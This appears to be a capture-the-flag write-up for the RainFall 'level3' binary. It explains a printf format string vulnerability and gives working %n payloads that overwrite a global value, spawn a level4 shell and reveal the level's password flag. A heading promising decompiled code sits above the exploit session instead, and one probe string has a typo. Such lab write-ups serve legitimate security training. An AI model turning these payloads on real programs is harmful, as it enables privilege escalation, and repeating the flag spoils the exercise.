Decompiled version of the program from BinaryNinja:

```c
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "%60d%4$n"'; cat) | ./level3 
�                                                           
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

A vulnerability in the form of a format string attack can be directly observed on the printf function, as it is called in this manner: `printf(&var_20c)`. This enables us to read and overwrite the stack. The objective here seems to be rewriting the value of EAX in order to invoke /bin/sh as user level4.

Resources on this type of vulnerability:

- https://www.unilim.fr/pages_perso/patrick.poulingeas/Enseignements/2004_2005/Master1/FormatString.pdf
- https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Les%20failles%20Format%20String.pdf
- https://www.re-xe.com/format-string-bugs/

If we check the function v, we can see that the value contained at address `0x804988c` is stored in EAX before the comparison between EAX and 0x40 (64 in decimal) is carried out:

```assembly
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x218,%esp
   0x080484ad <+9>:	mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax ; <== here
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret
```

So, we simply need to rewrite the value present at this address using printf.

Using the formatter `%08x` allows us to advance 4 bytes each time in the stack:

```shell
level3@RainFall:~$ python -c 'print "AAAA %08x %08x %x08 %08x %08x %08x"' | ./level3 
AAAA 00000200 b7fd1ac0 b7ff37d008 41414141 38302520 30252078
```

We can see that our string begins from the 4th formatter, which is the one we control.
Thus, we can directly write the value 0x40 to this address as follows:

```shell
(python -c 'print "\x8c\x98\x04\x08" + "%60d%4$n"'; cat) | ./level3
```

In this case, the `%n` formatter will read the first 4 bytes, which constitute the address where EAX will retrieve the value, and then it will rewrite the value present at that address. The initial value is 4 since we are displaying 4 bytes (the address). We can add the remainder using `%60d`, which makes 4 + 60 = 64 | 0x40.

Alternatively, we could write it like this, for example:

```shell
(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; cat) | ./level3
```

And there's the flag:

```shell
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "%60d%4$n"'; cat) | ./level3 
�                                                           
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```


